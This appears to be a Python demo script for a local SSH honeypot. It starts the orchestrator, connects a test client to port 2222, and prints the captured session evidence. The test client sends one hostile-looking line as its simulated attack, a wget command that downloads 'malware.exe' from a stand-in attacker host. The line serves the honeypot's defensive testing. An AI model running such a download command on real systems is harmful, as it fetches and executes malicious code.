#!/usr/bin/env python
"""
Complete Honeypot Demo - Following COMPLETE_HONEYPOT_SETUP_GUIDE.txt
Runs: Orchestrator + Test Client + Shows Session Evidence
"""
import subprocess
import time
import socket
import json
import threading
from pathlib import Path

def print_header(text):
    print("\n" + "="*70)
    print(text.center(70))
    print("="*70)

def start_orchestrator():
    """Start honeypot orchestrator in background thread"""
    from src.orchestrator import Orchestrator
    print("[*] Starting Orchestrator...")
    orch = Orchestrator()
    orch.start()

def wait_for_port(port=2222, timeout=5):
    """Wait for orchestrator to open port"""
    end = time.time() + timeout
    while time.time() < end:
        try:
            s = socket.create_connection(('127.0.0.1', port), timeout=0.5)
            s.close()
            return True
        except:
            time.sleep(0.2)
    return False

def run_test_client():
    """Connect to honeypot and send attack command"""
    print("[*] Connecting to honeypot...")
    try:
        sock = socket.create_connection(('127.0.0.1', 2222), timeout=3)
        print("[+] Connected to 127.0.0.1:2222")
        
        # Receive banner
        try:
            banner = sock.recv(1024)
            print(f"[*] Banner: {banner.decode(errors='ignore')[:60]}")
        except:
            pass
        
        # Send attack payload (wget command)
        attack_cmd = b"wget http://attacker.com/malware.exe\n"
        sock.sendall(attack_cmd)
        print(f"[+] Sent: {attack_cmd.decode()}")
        
        time.sleep(0.5)
        
        # Get response
        try:
            resp = sock.recv(1024)
            if resp:
                print(f"[*] Response: {resp.decode(errors='ignore')[:60]}")
        except:
            pass
        
        sock.close()
        print("[+] Session completed")
        return True
        
    except Exception as e:
        print(f"[!] Client failed: {e}")
        return False

def display_session_evidence():
    """Show captured honeypot session from data/sessions/"""
    print_header("HONEYPOT SESSION EVIDENCE")
    
    sessions_dir = Path("data/sessions")
    if not sessions_dir.exists():
        print("[!] No sessions directory")
        return
    
    sessions = sorted([p for p in sessions_dir.iterdir() if p.is_dir()], key=lambda p: p.name)
    if not sessions:
        print("[!] No sessions captured")
        return
    
    latest = sessions[-1]
    meta_file = latest / "meta.json"
    
    if not meta_file.exists():
        print(f"[!] No meta.json in {latest}")
        return
    
    with open(meta_file, 'r', encoding='utf-8') as f:
        session_data = json.load(f)
    
    print(f"\nSession ID: {latest.name}")
    print(f"Source IP: {session_data.get('src_ip', 'N/A')}")
    print(f"Source Port: {session_data.get('src_port', 'N/A')}")
    print(f"Events: {len(session_data.get('events', []))}")
    print("\nFull Session Data:")
    print(json.dumps(session_data, indent=2))
    
    # Show payloads
    payloads = list(latest.glob("*.bin"))
    if payloads:
        print(f"\n[+] Captured Payloads:")
        for p in payloads:
            print(f"    - {p.name}: {p.stat().st_size} bytes")

def main():
    print_header("HONEYPOT COMPLETE SETUP GUIDE - PHASE 6 EXECUTION")
    print("\nOption C: LOCAL DEVELOPMENT (No VMs)")
    print("Port 2222: Honeypot SSH listener")
    print("Port 8501: Streamlit Dashboard")
    
    # 1. Start orchestrator
    print("\n[STEP 1] Starting Orchestrator...")
    t = threading.Thread(target=start_orchestrator, daemon=True)
    t.start()
    
    # 2. Wait for port
    print("[STEP 2] Waiting for port 2222...")
    if not wait_for_port(2222, timeout=5):
        print("[!] Orchestrator did not open port 2222")
        return
    print("[+] Port 2222 is open")
    
    # 3. Run test client
    print("\n[STEP 3] Running Test Client...")
    time.sleep(0.5)
    if run_test_client():
        time.sleep(1)
        
        # 4. Display evidence
        print("\n[STEP 4] Displaying Session Evidence...")
        display_session_evidence()
    
    # 5. System status
    print_header("HONEYPOT SYSTEM STATUS")
    print("\n[+] Orchestrator: http://127.0.0.1:2222 (ACTIVE)")
    print("[+] Streamlit Dashboard: http://localhost:8501 (ACTIVE)")
    print("[+] Session Data: data/sessions/")
    print("[+] Logs: logs/orchestrator_reports.log")
    print("\nTo access dashboard, open: http://localhost:8501")
    print("="*70 + "\n")

if __name__ == "__main__":
    main()
